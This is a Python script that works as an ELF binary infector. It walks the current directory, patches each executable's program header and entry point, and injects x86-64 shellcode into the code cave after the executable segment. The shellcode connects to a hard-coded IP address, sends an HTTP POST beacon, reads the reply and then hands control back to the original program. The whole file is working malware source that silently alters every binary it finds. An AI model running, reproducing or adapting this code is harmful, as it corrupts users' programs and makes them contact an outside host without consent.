from elftools.elf.elffile import ELFFile
import os
import magic


def modify_file(offset,data):
    """Overwrites file with data at given offset
    """
    FILE.seek(offset)
    FILE.write(data)

def is_directory(path):
    return os.path.isdir(path)

def is_elf(file_path):
    mime = magic.Magic()
    file_type = mime.from_file(file_path)
    return "ELF" in file_type

def is_executable(file_path):
    """Returns if the ELF file is an executable or shared object
    """
    with open(file_path, 'rb') as f:
        elf_file = ELFFile(f)
        elf_type = elf_file.header['e_type']
        return elf_type == 'ET_EXEC' or elf_type == 'ET_DYN'

def determine_execute_segment():
    for i in range(NUM_SEGMENTS):
        if ELF.get_segment(i)['p_flags'] & 0x1 == 1:
            return i
    return None

def calculate_available_space(execute_segment_index):
    """Returns the space between the end of execution segment of code and the next segment
    """
    execute_segment_virtual_address = ELF.get_segment(execute_segment_index)['p_vaddr']
    execute_segment_memsize = ELF.get_segment(execute_segment_index)['p_memsz']
    execute_segment_end_virtual_address = execute_segment_virtual_address + execute_segment_memsize
    max_space = 2 ** 63 - 1 # Highest 64 bit value
    for i in range(NUM_SEGMENTS):
        if i == execute_segment_index:
            continue
        if ELF.get_segment(i)['p_vaddr'] >= execute_segment_end_virtual_address:
            space = ELF.get_segment(i)['p_vaddr'] - execute_segment_end_virtual_address
            if space < max_space:
                max_space = space
    return max_space

def determine_inject_offset(execute_segment):
    """Returns the offset of the end of the execute segment's corresponding file offset
       if there is space
       else returns None
    """
    available_space = calculate_available_space(execute_segment)
    if INJECT_SIZE < available_space:
        return ELF.get_segment(execute_segment)['p_offset'] + ELF.get_segment(execute_segment)['p_filesz']
    else:
        return None


def get_section_index_of_offset(offset):
    """Returns the section index of a given offset
       (only used for debugging)
    """
    for i in range(ELF.num_sections()):
        section = ELF.get_section(i)
        if offset >=section['sh_offset'] and offset < (section['sh_offset'] + section['sh_size']):
            return i
    return None

def edit_inject_section_size(inject_index):
    """Edits the injected section's size
       (only used for debugging)
    """
    section_size = ELF.get_section(inject_index)['sh_size']
    total_section_size_offset = SECTION_HEADER_TABLE_OFFSET + SECTION_HEADER_TABLE_ENTRY_SIZE * inject_index + SECTION_FILE_OFFSET_STRUCT_OFFSET
    modify_file(total_section_size_offset,(section_size+INJECT_SIZE).to_bytes(8,'little'))

def edit_entry_point(inject_offset):
    """Changes the entry point to the inject offset
    """
    modify_file(ENTRY_POINT_STRUCT_OFFSET,(inject_offset).to_bytes(8,'little'))
    

def edit_program_header(execute_segment):
    """Edits the file size and memory size of the inject segment
    """
    segment = ELF.get_segment(execute_segment)
    segment_offset = PROGRAM_HEADER_OFFSET + execute_segment * PROGRAM_HEADER_ENTRY_SIZE
    modify_file(segment_offset + PROGRAM_HEADER_FILESZ_STRUCT_OFFSET,(segment['p_filesz']+INJECT_SIZE).to_bytes(8,'little'))
    modify_file(segment_offset + PROGRAM_HEADER_MEMSZ_STRUCT_OFFSET,(segment['p_memsz']+INJECT_SIZE).to_bytes(8,'little'))


def inject_code(inject_offset):
    """Injects the code into the file at inject offset
    """
    offset = inject_offset
    for i in range(len(inject)):
        if i == len(inject)-1:
            modify_file(offset,inject[i].to_bytes(4,'little'))
            break
        modify_file(offset,inject[i].to_bytes(1,'little'))
        offset = offset + 1

PROGRAM_HEADER_FILESZ_STRUCT_OFFSET = 32
PROGRAM_HEADER_MEMSZ_STRUCT_OFFSET = 40
ENTRY_POINT_STRUCT_OFFSET = 24
SECTION_FILE_OFFSET_STRUCT_OFFSET = 32

current_directory = os.getcwd()
files = os.listdir(current_directory)

for f in files:
    FILE_NAME = f
    FILE = None
    if not(not is_directory(f) and is_elf(f) and is_executable(f)):
        continue
    try:
        with open(FILE_NAME, 'r+b') as FILE:
            FILE = open(FILE_NAME,'r+b')
    except OSError as e:
        print(f,": Error opening. Skipping file.")
        continue
    ELF = ELFFile(open(FILE_NAME,'rb'))

    SECTION_HEADER_TABLE_OFFSET = ELF['e_shoff']
    SECTION_HEADER_TABLE_ENTRY_SIZE = ELF['e_shentsize']
    PROGRAM_HEADER_OFFSET = ELF['e_phoff']
    PROGRAM_HEADER_ENTRY_SIZE = ELF['e_phentsize']
    NUM_SEGMENTS = ELF.num_segments()
    ENTRY_POINT = ELF['e_entry']
    
    INJECT_SIZE = 0x278 + 3 # size of inject array plus 3 to account for jmp instruction

    execute_segment_index = determine_execute_segment()
    inject_offset = determine_inject_offset(execute_segment_index)
    if inject_offset is None:
        print(f,": Could not inject code due to not enough available free memory space.")
        continue
    
    #not required used for debugging with objdump
    #INJECT_INDEX = get_section_index_of_offset(INJECT_OFFSET-1)
    #edit_inject_section_size(INJECT_INDEX)
    
    edit_entry_point(inject_offset)
    edit_program_header(execute_segment_index)

    len_of_inject_array = 0x278
    instruction_pointer = inject_offset + len_of_inject_array + 3 # 3 accounts for the size of the jmp instruction
    jmp_to_start_operand = 0xffffffff + 1 - abs(ENTRY_POINT - instruction_pointer)

    inject = [
    0xf3, 0x0f, 0x1e, 0xfa,                                     # enbr64
    0x50,                                                       # push %rax
    0x52,                                                       # push %rdx
    0x56,                                                       # push %rsi
    0x57,                                                       # push %rdi
    0x51,                                                       # push %rcx
    0x55,                                                       # push %rbp
    0x48, 0x89, 0xe5,                                           # mov %rsp, %rbp
    0x48, 0x81, 0xec, 0x00, 0x10, 0x00, 0x00,                   # sub $0x1000, %rsp
    0x48, 0x83, 0x0c, 0x24, 0x00,                               # orq $0x0, (%rsp)
    0x48, 0x83, 0xec, 0x70,                                     # sub $0x70, %rsp
    0x64, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00,       # %fs:0x28, %rax
    0x48, 0x89, 0x45, 0xf8,                                     # mov %rax,-0x8(%rbp)
    0x31, 0xc0,                                                 # xor %eax, %eax
    0x48, 0xb8, 0x50, 0x4f, 0x53, 0x54, 0x20, 0x2f, 0x63, 0x6f, # movabs $0x6f632f2054534f50, %rax
    0x48, 0xba, 0x64, 0x65, 0x2d, 0x69, 0x6e, 0x6a, 0x65, 0x63, # movabs $0x63656a6e692d6564, %rdx
    0x48, 0x89, 0x85, 0xc0, 0xef, 0xff, 0xff,                   # mov %rax, -0x1040(%rbp)
    0x48, 0x89, 0x95, 0xc8, 0xef, 0xff, 0xff,                   # mov %rdx, -0x1038(%rbp)
    0x48, 0xb8, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x74, 0x69, 0x6d, # movabs $0x6d69742f6e6f6974,%rax
    0x48, 0xba, 0x65, 0x73, 0x74, 0x61, 0x6d, 0x70, 0x73, 0x20, # movabs $0x2073706d61747365,%rdx
    0x48, 0x89, 0x85, 0xd0, 0xef, 0xff, 0xff,                   # mov %rax, -0x1030(%rbp)
    0x48, 0x89, 0x95, 0xd8, 0xef, 0xff, 0xff,                   # mov %rdx, -0x1028(%rbp)
    0x48, 0xb8, 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x30, # movabs $0x302e312f50545448,%rax
    0x48, 0x89, 0x85, 0xe0, 0xef, 0xff, 0xff,                   # mov %rax, -0x1020(%rbp)
    0xc7, 0x85, 0xe8, 0xef, 0xff, 0xff, 0x0d, 0x0a, 0x0d, 0x0a, # movl $0xa0d0a0d, -0x1018(%rbp)
    0xba, 0x00, 0x00, 0x00, 0x00,                               # mov $0x0, %edx
    0xbe, 0x01, 0x00, 0x00, 0x00,                               # mov $0x1, %esi
    0xbf, 0x02, 0x00, 0x00, 0x00,                               # mov $0x2, %edi 
    
    0xf3,   0x0f,    0x1e,    0xfa,    0xb8,    0x29,    0x00,    0x00,
0x00,    0x0f,   0x05,    0x48,    0x3d,    0x01,    0xf0,   0xff,
0xff,    0x0f, 0x83, 0xbe,    0x01, 0x00, 0x00
    
    ,                               # socket
    0x89, 0x85, 0xa4, 0xef, 0xff, 0xff,                         # mov %eax, -0x105c(%rbp)
    0x83, 0xbd, 0xa4, 0xef, 0xff, 0xff, 0x00,                   # cmpl $0x0, -0x105c(%rbp)
    0x0f, 0x88, 0xab, 0x01, 0x00, 0x00,                         # js 
    0x66, 0xc7, 0x85, 0xb0, 0xef, 0xff, 0xff, 0x02, 0x00,       # movw $0x2, -0x1050(%rbp)
    0x66, 0xc7, 0x85, 0xb2, 0xef, 0xff, 0xff, 0x00, 0x50,       # movw $0x5000, -104e(%rbp)
    0xc7, 0x85, 0xb4, 0xef, 0xff, 0xff, 0x43, 0xf7, 0x6a, 0xff, # movl $0xff6af743, -0x104c(%rbp)
    0x48, 0x8d, 0x8d, 0xb0, 0xef, 0xff, 0xff,                   # lea -0x1050(%rbp),%rcx
    0x8b, 0x85, 0xa4, 0xef, 0xff, 0xff,                         # mov -0x105c(%rbp),%eax
    0xba, 0x10, 0x00, 0x00, 0x00,                               # mov $0x10, %edx
    0x48, 0x89, 0xce,                                           # mov %rcx, %rsi
    0x89, 0xc7,                                                 # mov %eax, %edi     
    
    0xf3,    0x0f,    0x1e,    0xfa,   0x64,    0x8b,    0x04,    0x25,
0x18,    0x00,    0x00,    0x00,    0x85,   0xc0,    0x0f, 0x85, 0x3d, 0x01, 0x00, 0x00,
0xb8,    0x2a,    0x00,    0x00,   0x00,   0x0f,  0x05,  0x48,
0x3d  ,  0x00  ,  0xf0 ,   0xff ,   0xff ,   0x0f ,   0x87, 0x2a, 0x01, 0x00, 0x00


    ,                               # connect
    0x85, 0xc0,                                                 # test %eax, %eax
    0x0f, 0x88, 0x22, 0x01, 0x00, 0x00,                         # js 
    0xc7, 0x85, 0x9c, 0xef, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, # movl $0x0, -0x1064(%rbp)
    0xb8, 0x2c, 0x00, 0x00, 0x00,                               # mov $0x2c, %eax
    0x2b, 0x85, 0x9c, 0xef, 0xff, 0xff,                         # sub -0x1064(%rbp), %eax
    0x48, 0x63, 0xd0,                                           # movslq %eax, %rdx
    0x8b, 0x85, 0x9c, 0xef, 0xff, 0xff,                         # mov -0x1064(%rbp), %eax
    0x48, 0x98,                                                 # cltq
    0x48, 0x8d, 0x8d, 0xc0, 0xef, 0xff, 0xff,                   # lea -0x1040(%rbp), %rcx
    0x48, 0x01, 0xc1,                                           # add %rax, %rcx
    0x8b, 0x85, 0xa4, 0xef, 0xff, 0xff,                         # mov -0x105c(%rbp), %eax
    0x48, 0x89, 0xce,                                           # mov %rcx, %rsi
    0x89, 0xc7,                                                 # mov %eax, %edi         
    
    0xf3,    0x0f  ,  0x1e ,   0xfa ,   0x64 ,   0x8b ,   0x04   ,   0x25,
0x18 ,   0x00  ,  0x00  ,  0x00  ,  0x85 ,   0xc0  ,  0x0f, 0x85, 0xdc, 0x00, 0x00, 0x00,
0xb8 ,   0x01,    0x00  ,  0x00 ,   0x00  ,  0x0f ,   0x05  ,    0x48,
0x3d  ,  0x00 ,   0xf0 ,   0xff  ,  0xff  ,  0x0f, 0x87, 0xc9, 0x00, 0x00, 0x00 
    
    ,                               # write
    0x89, 0x85, 0xa8, 0xef, 0xff, 0xff,                         # mov %eax, -0x1058(%rbp)
    0x83, 0xbd, 0xa8, 0xef, 0xff, 0xff, 0x00,                   # cmpl $0x0, -0x1058(%rbp)
    0x0f, 0x88, 0xb6, 0x00, 0x00, 0x00,                         # js 
    0x83, 0xbd, 0xa8, 0xef, 0xff, 0xff, 0x00,                   # cmpl $0x0, -0x1058(%rbp)
    0x74, 0x1b,                                                 # je 
    0x8b, 0x85, 0xa8, 0xef, 0xff, 0xff,                         # mov -0x1058(%rbp),%eax
    0x01, 0x85, 0x9c, 0xef, 0xff, 0xff,                         # add %eax, -0x1064(%rbp)
    0x83, 0xbd, 0x9c, 0xef, 0xff, 0xff, 0x2b,                   # cmpl $0x2b, -0x1064(%rbp)
    0x0f, 0x8e, 0x79, 0xff, 0xff, 0xff,                         # jle 
    0xeb, 0x01,                                                 # jmp 
    0x90,                                                       # nop
    0xc7, 0x85, 0xac, 0xef, 0xff, 0xff, 0xff, 0x0f, 0x00, 0x00, # movl $0xfff, -0x1054(%rbp)
    0xc7, 0x85, 0xa0, 0xef, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, # movl $0x0, -0x1060(%rbp)
    0x8b, 0x85, 0xac, 0xef, 0xff, 0xff,                         # movl -0x1054(%rbp), %eax
    0x2b, 0x85, 0xa0, 0xef, 0xff, 0xff,                         # sub -0x1060(%rbp), %eax
    0x48, 0x63, 0xd0,                                           # movslq %eax, %rdx
    0x8b, 0x85, 0xa0, 0xef, 0xff, 0xff,                         # mov -0x1060(%rbp), %eax
    0x48, 0x98,                                                 # cltq
    0x48, 0x8d, 0x8d, 0xf0, 0xef, 0xff, 0xff,                   # lea -0x1010(%rbp), %rcx
    0x48, 0x01, 0xc1,                                           # add %rax, %rcx
    0x8b, 0x85, 0xa4, 0xef, 0xff, 0xff,                         # mov -0x105c(%rbp),%eax
    0x48, 0x89, 0xce,                                           # mov %rcx, %rsi
    0x89, 0xc7,                                                 # mov %eax, %edi       
    
    0xf3  ,  0x0f  ,  0x1e   , 0xfa  ,  0x64  ,  0x8b ,   0x04  ,    0x25,
0x18 ,   0x00 ,   0x00  ,  0x00 ,   0x85 ,   0xc0  ,  0x75  ,    0x44,
0x0f  ,  0x05 ,   0x48 ,   0x3d   , 0x00  ,  0xf0 ,   0xff ,     0xff,
0x77  ,  0x3a  
    
    
    ,                               # read
    0x89, 0x85, 0xa8, 0xef, 0xff, 0xff,                         # mov %eax, -0x1058(%rbp)
    0x83, 0xbd, 0xa8, 0xef, 0xff, 0xff, 0x00,                   # cmpl $0x0, -0x1058(%rbp)
    0x78, 0x2b,                                                 # js 
    0x83, 0xbd, 0xa8, 0xef, 0xff, 0xff, 0x00,                   # cmpl $0x0, -0x1058(%rbp)
    0x74, 0x25,                                                 # je 
    0x8b, 0x85, 0xa8, 0xef, 0xff, 0xff,                         # mov -0x1058(%rbp), %eax
    0x01, 0x85, 0xa0, 0xef, 0xff, 0xff,                         # add %eax, -0x1060(%rbp)
    0x8b, 0x85, 0xa0, 0xef, 0xff, 0xff,                         # mov -0x1060(%rbp), %eax
    0x3b, 0x85, 0xac, 0xef, 0xff, 0xff,                         # cmp -0x1054(%rbp), %eax
    0x7c, 0x88,                                                 # jl 
    0xeb, 0x0a,                                                 # jmp 
    0x90,                                                       # nop
    0xeb, 0x07,                                                 # jmp 
    0x90,                                                       # nop
    0xeb, 0x04,                                                 # jmp 
    0x90,                                                       # nop
    0xeb, 0x01,                                                 # jmp 
    0x90,                                                       # nop
    0x8b, 0x85, 0xa4, 0xef, 0xff, 0xff,                         # mov -0x105c(%rbp),%eax
    0x89, 0xc7,                                                 # mov %eax, %edi      

     0x64 ,   0x8b  ,  0x04  ,    0x25,
0x18  ,  0x00,    0x00  ,  0x00  ,  0x85 ,   0xc0 ,   0x75 ,     0x0a,
0xb8  ,  0x03 ,   0x00 ,   0x00  ,  0x00 ,   0x0f  ,  0x05  
  
    
    ,                               # close
    0xeb, 0x01,                                                 # jmp 
    0x90,                                                       # nop
    0xc9,                                                       # leaveq
    0x59,                                                       # pop %rcx
    0x5f,                                                       # pop %rdi
    0x5e,                                                       # pop %rsi
    0x5a,                                                       # pop %rdx
    0x58,                                                       # pop %rax
    0xe9, jmp_to_start_operand, 
]

    inject_code(inject_offset)
    print(f,": Successfully injected code.")
